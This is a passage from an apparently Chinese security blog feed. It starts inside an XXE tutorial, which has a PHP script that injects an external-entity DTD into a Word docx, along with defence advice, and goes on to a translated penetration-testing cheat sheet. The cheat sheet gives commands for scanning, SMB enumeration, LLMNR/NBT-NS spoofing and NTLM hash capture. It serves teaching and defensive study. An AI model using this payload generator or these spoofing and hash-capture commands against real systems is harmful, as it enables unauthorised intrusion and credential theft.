class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// by https://github.com/findneo</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genword</span><span class="params">($filename,$filecontent)</span></span>&#123;</span><br><span class="line">    $word = <span class="keyword">new</span> COM(<span class="string">"word.application"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to instantiate Word"</span>);</span><br><span class="line">    $word-&gt;Visible = <span class="number">0</span>;<span class="comment">//保持程序在后台运行</span></span><br><span class="line">    $word-&gt;Documents-&gt;Add();<span class="comment">//新建Word文档</span></span><br><span class="line">    $word-&gt;Selection-&gt;TypeText($filecontent);<span class="comment">//写入指定内容</span></span><br><span class="line">    $word-&gt;Documents[<span class="number">1</span>]-&gt;SaveAs(getcwd().<span class="string">"/"</span>.$filename);<span class="comment">//保存到指定路径</span></span><br><span class="line">    $word-&gt;Quit();<span class="comment">//退出程序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poisonWord</span><span class="params">($filename,$flag,$dtd,$entity_reference)</span> </span>&#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    $zip-&gt;open($filename);</span><br><span class="line">    $xml=$zip-&gt;getFromName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $prolog=<span class="string">'&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;'</span>;</span><br><span class="line">    $evilxml=str_replace([$prolog,$flag],[$prolog.$dtd,$flag.$entity_reference],$xml);<span class="comment">//构造恶意XML</span></span><br><span class="line">    $zip-&gt;deleteName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $zip-&gt;addFromString(<span class="string">"word/document.xml"</span>,$evilxml);<span class="comment">//更新docx文件</span></span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">    $zip-&gt;open($filename);</span><br><span class="line">    $xml=$zip-&gt;getFromName(<span class="string">'word/document.xml'</span>);</span><br><span class="line">    $doc_xml = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $doc_xml-&gt;loadXML($xml); <span class="comment">//加载word文档</span></span><br><span class="line">    $zip-&gt;close();</span><br><span class="line">    <span class="keyword">return</span> $doc_xml-&gt;textContent; <span class="comment">//读取文档内容</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这里定义想要添加的DTD内容和想要在XML中引用的实体</span></span><br><span class="line">$dtd=<span class="string">'&lt;!DOCTYPE ANY [&lt;!ENTITY xxe  SYSTEM "http://127.0.0.1:8088/?findneo"&gt;&lt;!ENTITY int "XXE"&gt;]&gt;'</span>;</span><br><span class="line">$entity_reference=<span class="string">"&amp;xxe; &amp;int; IS EXCITING!"</span>;</span><br><span class="line"></span><br><span class="line">$name=<span class="string">"demo.docx"</span>;<span class="comment">//生成文件的文件名</span></span><br><span class="line">$flag=<span class="string">"Across the Great Wall we can reach every corner in the world."</span>;<span class="comment">//文件内容，实体在该内容附近引用。</span></span><br><span class="line">genWord($name,$flag);<span class="comment">//生成一个指定内容和文件名的正常docx文件</span></span><br><span class="line">poisonWord($name,$flag,$dtd,$entity_reference);<span class="comment">//向正常文件注入DTD和实体引用，生成恶意文件</span></span><br><span class="line"><span class="keyword">echo</span> trigger($name);<span class="comment">//加载文件，测试效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//若程序不能正常运行，可尝试在 php.ini 末尾添加以下路径</span></span><br><span class="line"><span class="comment">//extension="php_com_dotnet.dll 路径"; extension="php_mbstring.dll 路径"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此外，Github项目 <a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener"><strong>oxml_xxe</strong></a>  支持更多文件类型。 </p><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>彻底禁用DTD是最好的，退一步，禁用外部实体/外部DTD也可以。具体参考 <a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Prevention_Cheat_Sheet" target="_blank" rel="noopener">XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a> 。</p><ul><li>禁用外部实体 ( <a href="http://cn2.php.net/libxml_disable_entity_loader" target="_blank" rel="noopener">http://cn2.php.net/libxml_disable_entity_loader</a> 等)<ul><li>对于PHP来说，尽管不同环境下<code>simplexml_load_string()</code> 默认行为并不一致，但为了安全应当总是<code>libxml_disable_entity_loader();</code> 。 </li></ul></li><li>检验数据来源，过滤数据</li></ul><p>PHP及其他语言或框架，是否默认解析外部实体，解析方式和在特定场景下的解析表现，与其使用的 libxml2 版本有关（如果是基于libxml2的话），也与XML解析器及其配置有关。就PHP而言，<code>libxml2 Version</code> 可以在phpinfo里看，本文使用的是<code>2.7.8</code> 。</p><p>这可能是一个误解的结果。</p><blockquote><p>在slimphp2中，官方是对这块进行一定处理了（。。。一些代码。。。）不知为何在3.0版本中官方就无视这个问题了。 我猜可能有两个原因： </p><p>1.官方注意到了这个问题，但认为3.0版本需求的php版本在5.5以上，而错以为5.5以上的php就已经不存在XXE的隐患了。但实际上XML外部实体的解析，和php版本并无关系，而是和编译时的libxml库版本有关。</p><p>2.官方尚未注意到这个问题。</p><p>感觉前者的可能性较大。  </p><p>—— wooyun-2015-0156208</p></blockquote><p>可以结合 <a href="http://www.xmlsoft.org/news.html" target="_blank" rel="noopener">change log</a> 和 <a href="https://github.com/GNOME/libxml2/commits" target="_blank" rel="noopener">GitHub commit</a> 了解 libxml2 各版本具体改动。</p><p>可以看到与主题较相关的有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v2<span class="number">.9</span><span class="number">.5</span>: Sep <span class="number">04</span> <span class="number">2017</span></span><br><span class="line">    Security:Detect infinite recursion in parameter entities (Nick Wellnhofer)</span><br><span class="line">    Prevent unwanted external entity reference</span><br><span class="line">v2<span class="number">.9</span><span class="number">.2</span>: Oct <span class="number">16</span> <span class="number">2014</span></span><br><span class="line">    Security:</span><br><span class="line">Fix <span class="keyword">for</span> CVE<span class="number">-2014</span><span class="number">-3660</span> billion laugh variant (Daniel Veillard),</span><br><span class="line">CVE<span class="number">-2014</span><span class="number">-0191</span> <span class="keyword">Do</span> not fetch external parameter entities (Daniel Veillard)</span><br><span class="line"><span class="number">2.9</span><span class="number">.1</span>: Apr <span class="number">19</span> <span class="number">2013</span></span><br><span class="line">    Activate detection of encoding in external subset</span><br><span class="line"><span class="number">2.9</span><span class="number">.0</span>: Sep <span class="number">11</span> <span class="number">2012</span></span><br><span class="line">    <span class="keyword">Do</span> not fetch external parsed entities</span><br></pre></td></tr></table></figure><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><ul><li><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf" target="_blank" rel="noopener">XML Out-Of-Band Data Retrieval</a>  </li><li><a href="https://www.vsecurity.com//download/publications/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">XMLDTDEntityAttacks.pdf</a> </li><li><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="noopener">XML External Entity (XXE) Processing</a>_Processing) </li><li><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">未知攻焉知防——XXE漏洞攻防</a> </li><li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">DTD Cheat Sheet</a> </li><li><a href="https://www.tutorialspoint.com/dtd/dtd_syntax.htm" target="_blank" rel="noopener">DTD - Syntax</a> </li><li><a href="https://phonexicum.github.io/infosec/xxe.html" target="_blank" rel="noopener">Information Security / infosec / XXE</a> </li><li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="noopener">XXE_payloads</a> </li><li><a href="https://www.w3schools.com/xml/xml_dtd_intro.asp" target="_blank" rel="noopener">DTD Tutorial</a> </li><li><a href="https://www.w3.org/TR/xml/" target="_blank" rel="noopener">Extensible Markup Language (XML) 1.0 (Fifth Edition)</a> </li><li><a href="https://msdn.microsoft.com/en-us/library/ms256483(v=vs.110" target="_blank" rel="noopener">about XML entity at msdn</a>.aspx)  </li><li>Spring MVC xml绑定pojo造成的XXE （乌云papers-1911）</li><li>Oracle盲注结合XXE漏洞远程获取数据（乌云papers-6035）</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>【译】渗透测试工具备忘录</title>
      <link href="/180727PenetrationTool/"/>
      <url>/180727PenetrationTool/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试工具备忘录"><a href="#渗透测试工具备忘录" class="headerlink" title="渗透测试工具备忘录"></a>渗透测试工具备忘录</h1><p><strong>本文翻译自 <a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="noopener">Penetration Testing Tools Cheat Sheet </a> ，首发<a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>渗透测试工具备忘录记录渗透测试时常用的命令，更深入的信息推荐参考特定工具的帮助文档或 <a href="https://highon.coffee/blog/" target="_blank" rel="noopener">本站</a> 其他备忘录。</p><p>本目录关注网络底层相关的渗透测试，除了少量sqlmap的命令和一些Web服务枚举外，基本不包含Web应用渗透测试的内容。关于Web应用测试，建议参考《黑客攻防技术宝典》，这本书不管是用作专门学习还是参考手册都是很棒的。</p><p>文中缺漏之处欢迎 <a href="https://twitter.com/Arr0way" target="_blank" rel="noopener">推特</a> 私戳。</p><h3 id="更新日志："><a href="#更新日志：" class="headerlink" title="更新日志："></a>更新日志：</h3><p>17/02/2017 ：更新文章，增加VPN，DNS隧道，VLAN hopping（跳跃攻击） 等内容。</p><h2 id="开始前"><a href="#开始前" class="headerlink" title="开始前"></a>开始前</h2><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><h4 id="设置IP-地址"><a href="#设置IP-地址" class="headerlink" title="设置IP 地址"></a>设置IP 地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 xxx.xxx.xxx.xxx/24</span><br></pre></td></tr></table></figure><h4 id="子网划分"><a href="#子网划分" class="headerlink" title="子网划分"></a>子网划分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ipcalc xxx.xxx.xxx.xxx/24 </span><br><span class="line">ipcalc xxx.xxx.xxx.xxx 255.255.255.0</span><br></pre></td></tr></table></figure><h2 id="公开来源情报"><a href="#公开来源情报" class="headerlink" title="公开来源情报"></a>公开来源情报</h2><h3 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h3><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><h5 id="WHOIS-枚举"><a href="#WHOIS-枚举" class="headerlink" title="WHOIS 枚举"></a>WHOIS 枚举</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois domain-name-here.com</span><br></pre></td></tr></table></figure><h5 id="查询DNS-IP"><a href="#查询DNS-IP" class="headerlink" title="查询DNS IP"></a>查询DNS IP</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig a domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h5 id="查询MX记录"><a href="#查询MX记录" class="headerlink" title="查询MX记录"></a>查询MX记录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig mx domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h5 id="用DIG-查询域传送"><a href="#用DIG-查询域传送" class="headerlink" title="用DIG 查询域传送"></a>用DIG 查询域传送</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig axfr domain-name-here.com @nameserver</span><br></pre></td></tr></table></figure><h2 id="DNS-域传送"><a href="#DNS-域传送" class="headerlink" title="DNS 域传送"></a>DNS 域传送</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></td><td>Windows DNS域传送</td></tr><tr><td><code>dig axfr blah.com @ns1.blah.com</code></td><td>Linux DNS 域传送</td></tr></tbody></table><h3 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h3><h4 id="Simply-Email"><a href="#Simply-Email" class="headerlink" title="Simply Email"></a>Simply Email</h4><p>使用Simply Email枚举所有所有网站（GitHub，目标站点等），配上代理或设置较长的访问间隔时间，这样就不会被Google发现是爬虫并用验证码拦住了。Simply Email还可以验证收集的邮件地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/killswitch-GUI/SimplyEmail.git</span><br><span class="line">./SimplyEmail.py -all -e TARGET-DOMAIN</span><br></pre></td></tr></table></figure><h3 id="半主动信息收集"><a href="#半主动信息收集" class="headerlink" title="半主动信息收集"></a>半主动信息收集</h3><h4 id="基本指纹识别"><a href="#基本指纹识别" class="headerlink" title="基本指纹识别"></a>基本指纹识别</h4><p>手动指纹识别/banner抓取</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nc -v 192.168.1.1 25</code> <br><code>telnet 192.168.1.1 25</code></td><td>通过显示banner识别版本和指纹</td></tr></tbody></table><h4 id="使用NC抓取banner"><a href="#使用NC抓取banner" class="headerlink" title="使用NC抓取banner"></a>使用NC抓取banner</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc TARGET-IP 80</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: TARGET-IP</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Referrer: meh-domain</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure><h3 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h3><h4 id="DNS-爆破"><a href="#DNS-爆破" class="headerlink" title="DNS 爆破"></a>DNS 爆破</h4><h5 id="DNSRecon"><a href="#DNSRecon" class="headerlink" title="DNSRecon"></a>DNSRecon</h5><table><thead><tr><th>DNS Enumeration Kali - DNSRecon</th></tr></thead><tbody><tr><td>root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std –xml ouput.xml</td></tr></tbody></table><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><h5 id="Nmap命令"><a href="#Nmap命令" class="headerlink" title="Nmap命令"></a>Nmap命令</h5><p>更多命令，详见 <a href="https://highon.coffee/blog/nmap-cheat-sheet/" target="_blank" rel="noopener">Nmap备忘录</a> 。</p><p>基本Nmap 命令：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nmap -v -sS -A -T4 target</code></td><td>详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪</td></tr><tr><td><code>nmap -v -sS -p--A -T4 target</code></td><td>同上，且扫描所有TCP端口，耗时更长</td></tr><tr><td><code>nmap -v -sU -sS -p- -A -T4 target</code></td><td>同上，且扫描所有UDP端口，耗时巨长</td></tr><tr><td><code>nmap -v -p 445 --script=smb-check-vulns  --script-args=unsafe=1 192.168.1.X</code></td><td>扫描可能包含漏洞的SMB服务</td></tr><tr><td>` ls /usr/share/nmap/scripts/*</td><td>grep ftp `</td><td>利用关键字搜索nmap脚本</td></tr></tbody></table><p>别在外网采用<code>T4</code> 扫描，使用<code>TCP</code> 连接扫描时用<code>T2</code> 比较合适。<code>T4</code> 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用<code>T4/T5</code> 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。</p><h6 id="Nmap-UDP扫描"><a href="#Nmap-UDP扫描" class="headerlink" title="Nmap UDP扫描"></a>Nmap UDP扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU TARGET</span><br></pre></td></tr></table></figure><h6 id="UDP-协议扫描器"><a href="#UDP-协议扫描器" class="headerlink" title="UDP 协议扫描器"></a>UDP 协议扫描器</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/portcullislabs/udp-proto-scanner.git</span><br></pre></td></tr></table></figure><p>扫描文件中IP地址的所有服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -f ip.txt</span><br></pre></td></tr></table></figure><p>扫描特定UDP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">udp-proto-scanner.pl -p ntp -f ips.txt</span><br></pre></td></tr></table></figure><h6 id="其他主机发现"><a href="#其他主机发现" class="headerlink" title="其他主机发现"></a>其他主机发现</h6><p>不使用nmap发现主机的方法：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>netdiscover -r 192.168.1.0/24</code></td><td>利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商</td></tr></tbody></table><h2 id="枚举和攻击网络服务"><a href="#枚举和攻击网络服务" class="headerlink" title="枚举和攻击网络服务"></a>枚举和攻击网络服务</h2><p>用于识别/枚举网络服务的工具。</p><h3 id="SAMB-SMB-Windows-域枚举"><a href="#SAMB-SMB-Windows-域枚举" class="headerlink" title="SAMB / SMB / Windows 域枚举"></a>SAMB / SMB / Windows 域枚举</h3><h4 id="Samba枚举"><a href="#Samba枚举" class="headerlink" title="Samba枚举"></a>Samba枚举</h4><h5 id="SMB枚举工具"><a href="#SMB枚举工具" class="headerlink" title="SMB枚举工具"></a>SMB枚举工具</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U &quot;&quot; target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure><p>当然也可参考本站的 <a href="https://highon.coffee/blog/nbtscan-cheat-sheet/" target="_blank" rel="noopener">nbtscan 的速查表</a> </p><h5 id="SMB-版本指纹识别"><a href="#SMB-版本指纹识别" class="headerlink" title="SMB 版本指纹识别"></a>SMB 版本指纹识别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //192.168.1.100</span><br></pre></td></tr></table></figure><h5 id="寻找开放的SMB共享"><a href="#寻找开放的SMB共享" class="headerlink" title="寻找开放的SMB共享"></a>寻找开放的SMB共享</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24</span><br></pre></td></tr></table></figure><h5 id="枚举SMB用户"><a href="#枚举SMB用户" class="headerlink" title="枚举SMB用户"></a>枚举SMB用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX</span><br></pre></td></tr></table></figure><p>RID循环（RID Cycling ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</span><br></pre></td></tr></table></figure><p>Metasploit的RID循环攻击模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_lookupsid</span><br></pre></td></tr></table></figure><h6 id="手动测试空会话"><a href="#手动测试空会话" class="headerlink" title="手动测试空会话"></a>手动测试空会话</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">net use \\TARGET\IPC$ &quot;&quot; /u:&quot;&quot;</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">smbclient -L //192.168.99.131</span><br></pre></td></tr></table></figure><h6 id="NBTScan-unixwiz"><a href="#NBTScan-unixwiz" class="headerlink" title="NBTScan unixwiz"></a>NBTScan unixwiz</h6><p>在Kali上安装使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nbtscan-unixwiz </span><br><span class="line">nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan</span><br></pre></td></tr></table></figure><h4 id="LLMNR-NBT-NS欺骗"><a href="#LLMNR-NBT-NS欺骗" class="headerlink" title="LLMNR / NBT-NS欺骗"></a>LLMNR / NBT-NS欺骗</h4><p>从网络中窃取凭证</p><h5 id="使用Metasploit进行-LLMNR-NetBIOS请求"><a href="#使用Metasploit进行-LLMNR-NetBIOS请求" class="headerlink" title="使用Metasploit进行 LLMNR / NetBIOS请求"></a>使用Metasploit进行 LLMNR / NetBIOS请求</h5><p>欺骗/毒化 LLMNR / NetBIOS请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/spoof/llmnr/llmnr_response</span><br><span class="line">auxiliary/spoof/nbns/nbns_response</span><br></pre></td></tr></table></figure><p>抓取哈希</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/server/capture/smb</span><br><span class="line">auxiliary/server/capture/http_ntlm</span><br></pre></td></tr></table></figure><p>最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。</p><h5 id="Responder-py"><a href="#Responder-py" class="headerlink" title="Responder.py"></a>Responder.py</h5><p>你也可以选择使用 responder</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SpiderLabs/Responder.git</span><br><span class="line">python Responder.py -i local-ip -I eth0</span><br></pre></td></tr></table></figure><p>注：整个渗透测试过程可以一直允许Responder.py</p><h4 id="SNMP枚举工具"><a href="#SNMP枚举工具" class="headerlink" title="SNMP枚举工具"></a>SNMP枚举工具</h4><p>SNMP枚举工具有很多。</p><p>美化SNMP输出结果使易于阅读。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp-mibs-downloader download-mibs</span><br><span class="line">echo &quot;&quot; &gt; /etc/snmp/snmp.conf</span><br></pre></td></tr></table></figure><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>snmpcheck -t 192.168.1.X -c public</code><br>` snmpwalk -c public -v1 192.168.1.X 1</td><td>grep hrSWRunName</td><td>cut -d<em> </em> -f  <code>&lt;br /&gt;</code> snmpenum -t 192.168.1.X <code>&lt;br /&gt;</code> onesixtyone -c names -i hosts `</td><td>SNMP枚举</td></tr></tbody></table><h5 id="SNMPv3枚举工具"><a href="#SNMPv3枚举工具" class="headerlink" title="SNMPv3枚举工具"></a>SNMPv3枚举工具</h5><p>使用nmap识别SNMPv3服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 161 --script=snmp-info TARGET-SUBNET</span><br></pre></td></tr></table></figure><p>Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install snmp snmp-mibs-downloader</span><br><span class="line">wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</span><br></pre></td></tr></table></figure><p>注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">在GitHub上的安全列表</a> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</span><br></pre></td></tr></table></figure><h4 id="远程服务枚举"><a href="#远程服务枚举" class="headerlink" title="远程服务枚举"></a>远程服务枚举</h4><p>这已是老生常谈，但为了本文内容的全面还是包含如下。</p><p><code>nmap -A</code> 会进行下面列举的所有远程服务的枚举，所以这里只是顺便提及。</p><h5 id="RSH-枚举"><a href="#RSH-枚举" class="headerlink" title="RSH 枚举"></a>RSH 枚举</h5><h6 id="RSH运行命令"><a href="#RSH运行命令" class="headerlink" title="RSH运行命令"></a>RSH运行命令</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsh &lt;target&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure><h6 id="MetasploitRSH-登陆扫描"><a href="#MetasploitRSH-登陆扫描" class="headerlink" title="MetasploitRSH 登陆扫描"></a>MetasploitRSH 登陆扫描</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rservices/rsh_login</span><br></pre></td></tr></table></figure><h6 id="使用rusers显示已登陆用户"><a href="#使用rusers显示已登陆用户" class="headerlink" title="使用rusers显示已登陆用户"></a>使用rusers显示已登陆用户</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rusers -al 192.168.2.1</span><br></pre></td></tr></table></figure><h6 id="使用rlogin扫描整个子网"><a href="#使用rlogin扫描整个子网" class="headerlink" title="使用rlogin扫描整个子网"></a>使用rlogin扫描整个子网</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rlogin -l &lt;user&gt; &lt;target&gt;</span><br><span class="line">e.g rlogin -l root TARGET-SUBNET/24</span><br></pre></td></tr></table></figure><h4 id="使用finger枚举"><a href="#使用finger枚举" class="headerlink" title="使用finger枚举"></a>使用finger枚举</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">finger @TARGET-IP</span><br><span class="line">finger batman@TARGET-IP</span><br></pre></td></tr></table></figure><h5 id="利用Solaris的bug显示所有已登录用户"><a href="#利用Solaris的bug显示所有已登录用户" class="headerlink" title="利用Solaris的bug显示所有已登录用户"></a>利用Solaris的bug显示所有已登录用户</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">finger 0@host  </span><br><span class="line"></span><br><span class="line">SunOS: RPC services allow user enum:</span><br><span class="line">$ rusers # users logged onto LAN</span><br><span class="line"></span><br><span class="line">finger &apos;a b c d e f g h&apos;@sunhost</span><br></pre></td></tr></table></figure><h4 id="rwho"><a href="#rwho" class="headerlink" title="rwho"></a>rwho</h4><p>使用nmap识别运行rwhod服务（513端口，UDP协议）的机器。</p><h2 id="TLS-amp-SSL-测试"><a href="#TLS-amp-SSL-测试" class="headerlink" title="TLS&amp;SSL 测试"></a>TLS&amp;SSL 测试</h2><h3 id="testssl-sh"><a href="#testssl-sh" class="headerlink" title="testssl.sh"></a>testssl.sh</h3><p>测试单一主机并将结果输出的HTML文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html</span><br></pre></td></tr></table></figure><h2 id="漏洞评估"><a 